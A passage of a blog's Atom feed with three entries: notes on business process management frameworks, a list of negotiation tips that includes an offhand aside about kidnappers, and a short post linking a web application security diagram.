    <link href="https://www.securesql.info/2012/04/20/are-we-there-yet-not-even-close-38841/" rel="alternate" type="text/html" title="Management Wednesday- BPM isn’t beats per minute."/>
    <published>2012-04-20T00:00:00-07:00</published>
    <updated>2012-04-20T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/04/20/are-we-there-yet-not-even-close-38841</id>
    <content type="html" xml:base="https://www.securesql.info/2012/04/20/are-we-there-yet-not-even-close-38841/"><![CDATA[<p>I was chatting with Alexander Peters and he mentioned an interesting
statistic. “…more than half of business process pros operate with immature
management practices. Only one-in-five respondents said that their change
initiatives fulfill the maturity criteria for managed and optimized
initiatives…”</p>

<p>This is quite concerning considering business professionals are charged with
ensuring their business unit succeeds.  Yet, it shouldn’t surprise me.
Continually, peers tell me about some new process they have to jump through
hoops to satisfy a checkbox while hurting their business unit by consuming all
available resources. It appears middle management doesn’t understand the
fundamentals of constructing and managing processes.</p>

<p>Process management is a repeatable, iterative practice to optimize an entity’s
workflow(s).  The basic goals are leaner, greater efficiency, and agile
processes. While it is safe to assume, ensure the processes to be optimized /
created are set to accomplish the entity’s objective(s).</p>

<p>In the Information Service related-industries, many can find the following
three root causes: human error, lacking stakeholder focus, and
miscommunication. Personally, I utilize policies, mechanisms, incentives, and
/ or assurance to provide a stable business unit foundation.  Do not think of
process management as the golden egg to solve all woes. One will want to
concern their efforts with sustaining and enhancing an entity’s assets and
core operations.</p>

<p>Others have reinvented this wheel numerous times. Reinventing the process
methodologies wheel has lead to three different framework classes:</p>

<ul>
  <li>Horizontal frameworks deal with design and development of business processes. Resources are focused on technology and reuse.</li>
  <li>Vertical frameworks focus on a specific set of coordinated tasks.  Resources are focused on pre-built templates, which may be readily configured and deployed.</li>
  <li>Lastly, full service process frameworks have five basic abstractions and distinct resources:</li>
  <li>
    <ul>
      <li>Scoping processes and project(s)</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>Designing and modeling processes</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>Rules engine</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>Flow engine</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>Testing and simulation</li>
    </ul>
  </li>
</ul>

<p>Instead of wasting your two minutes of attention, in later posts, we will be
covering each specific abstraction.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="business process management"/>
    <category term="management practices"/>
    <category term="change initiatives"/>
    <category term="process optimization"/>
    <category term="human error"/>
    <category term="stakeholder focus"/>
    <category term="miscommunication"/>
    <category term="process frameworks"/>
    <category term="business efficiency"/>
    <category term="agile processes"/>
    <category term="information services"/>
    <summary type="html"><![CDATA[I was chatting with Alexander Peters and he mentioned an interesting statistic.]]></summary>
  </entry>
  <entry>
    <title type="html">Management Wednesday - Negotation</title>
    <link href="https://www.securesql.info/2012/04/07/chanage-management-management/" rel="alternate" type="text/html" title="Management Wednesday - Negotation"/>
    <published>2012-04-07T00:00:00-07:00</published>
    <updated>2012-04-07T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/04/07/chanage-management-management</id>
    <content type="html" xml:base="https://www.securesql.info/2012/04/07/chanage-management-management/"><![CDATA[<p>Management 101 - Negotiating</p>

<p>Observe yourself negotiating</p>

<p>The more time one spends preparing is directly related to win/win results</p>

<p>People undervalue value creation opportunities.</p>

<p>Once again, People undervalue value creation opportunities</p>

<p>However, value creation and distribution are hard areas to get right</p>

<p>There is a tension between creation and distribution</p>

<p>Beware, one can exploit cooperative behavior.</p>

<p>Do not be aggressive.  Aggressive behavior can spiral downward.</p>

<p>Act with purpose, not reactively.</p>

<p>Think of negotiation as teaching.  Teach others why you are right.</p>

<p>Explicit discussion helps</p>

<p>Maintain a separate relationship from substance</p>

<p>NEVER try to buy the relationship</p>

<p>Unconditionally offer a great relationship</p>

<p>Be easy to work with</p>

<p>Be trustworthy</p>

<p>Be respectful, polite, kind, cheerful, etc….</p>

<p>If one is the seller, ask questions.  Attempt to ask significantly more
questions than statements.</p>

<p>ACTIVE listening skills - Talk to them as if they were a friend</p>

<p>Ways to encourage active listening - Silence, Minimal encourages,
Paraphasing, Emotional labeling, Summarizing, Open questioning, and, lastly, I
statements.</p>

<RANDOM tidbit=""> If you deal with kidnappers, make it a pain in the ass for the
kidnappers to get your money.  Most mexicans, columbians, and the sort
kidnappers will not deal with americans due to the pain induced by the FBI
etc.  "You want me to sell my house?  Oh, ok. I talked to my realtor and says
that it isn't a good time to sell.  I can send you all of the money in my
checking account…."

 Find out their interests

 Ask about them, what they want, their interests - Make sure to see what they
talk about and how long. Give them the freedom to talk.

 Suggestion options, ask for criticism - ask them to criticize your idea.
"What are the problems with my idea?"

 Tell them what you think their interests are - offering them a draft that
they can markup

 Tell them your interests.

 Give them a role in problem-solving - think of them as a role in a movie
where they get to solve the problem, being the hero of the movie -  we can do
the password like this or we can do it like that.

 Knowing interests typically helps the relationship

 Give them time to find solutions.   "I do not need an answer now but lets
think about how to solve this…."  If there is no answer in some acceptable
time frame, then take charge….

 Generate options - make sure to control the negotiations.  Do not loose
control.

 IF one can control the negotiations, he/she can influence the attention.
Never ask THE question, aka "Do you want to buy a car?"

 Invent creative ideas for each issue.

 Invent in preparations and in negotiations - Talk about options each side
agrees in.

 Explicitly disavow commitment.

 Encourage stupid ideas

 Rearrange packages to add value

Present them with choices - would it be better for you to do it this way or
that way?  Listen, I have three ways to satisfy my needs and requirements.
What do you prefer?

 If one is able to model the negotiations in a simple manner with weights and
measures, use Pareto Efficiency modeling.

 At the onset of the negotiation, look for high and lows.

 Ask yourself, "How we can earn trust at the start?"

 Read a few of the papers by Kathleen McGinn
-&gt;[](http://drfd.hbs.edu/fit/public/facultyInfo.do?facInfo=pub&amp;facEmId=kmcginn)[http://drfd.hbs.edu/fit/public/facultyInfo.do?facInfo=pub&amp;facEmId=kmcginn](http://drfd.hbs.edu/fit/public/facultyInfo.do?facInfo=pub&amp;facEmId=kmcginn)
You will see those with no emotional baggage or ties win overall.  This
emotional game is nested in every negotiation with every situation.  MAy make
people more easy going.

 One can use the Ultimatum game to show Humans are irrational.
Economists/negotiators HATE this and need to recognize this.  Most people are
irrational because it is worth some value of resource to punish the other
person.  Rather rational behavior ;-)

 Study Nash Equilibrium then realize it doesn't hold true.  Humans have a
sense of reciprocity.  Gender and moral/cultural norms override Nash's
equilibrium.  

 Lastly, insist on fair criteria

  The Fair criteria should be independant standards which suggest what the
outcome should be.  

 Beware, fair criteria can be used as a sword - "Here is why this is fair.."
and/or as a shield - "How can I explain to my boss why that is right…."

 Truly, how do I know this is fair?

 Your other party will be open to persuasion if they see that you are

 TWO LAST VERY IMPORTANT TIPS

 The same agreement is worth more if it comes with a story of why we won

 Embrace stupidity as a tactic


</RANDOM>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="management wednesday"/>
    <category term="negotiation techniques"/>
    <category term="value creation"/>
    <category term="cooperative behavior"/>
    <category term="relationship building"/>
    <category term="active listening"/>
    <category term="problem solving"/>
    <category term="negotiation strategies"/>
    <category term="Pareto Efficiency"/>
    <category term="Nash Equilibrium"/>
    <category term="fair criteria"/>
    <category term="negotiation preparation"/>
    <category term="trust in negotiations"/>
    <category term="emotional intelligence"/>
    <category term="persuasion techniques"/>
    <summary type="html"><![CDATA[Management 101 - Negotiating Observe yourself negotiating The more time one spends preparing is directly related to win]]></summary>
  </entry>
  <entry>
    <title type="html">Web Application Security Dojo ‘grams</title>
    <link href="https://www.securesql.info/2011/04/02/web-application-security-dojo-grams/" rel="alternate" type="text/html" title="Web Application Security Dojo ‘grams"/>
    <published>2011-04-02T00:00:00-07:00</published>
    <updated>2011-04-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2011/04/02/web-application-security-dojo-grams</id>
    <content type="html" xml:base="https://www.securesql.info/2011/04/02/web-application-security-dojo-grams/"><![CDATA[<p>While finding innovative methods to visualize various web application
insecurity practices, I came across a great visual aid. Enjoy. Credit: Secure
Coding Dojo</p>

<p>View fullsize</p>

<p><img src="https://securesql.info/images/1_Tud8hr0fKiRDRrgS1Sw3tg.png.avif" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="web application security"/>
    <category term="visual aid"/>
    <category term="insecurity practices"/>
    <category term="secure coding dojo"/>
    <category term="innovative methods"/>
    <summary type="html"><![CDATA[While finding innovative methods to visualize various web application insecurity practices, I came across a great visual aid. Enjoy. Credit]]></summary>
  </entry>
</feed>
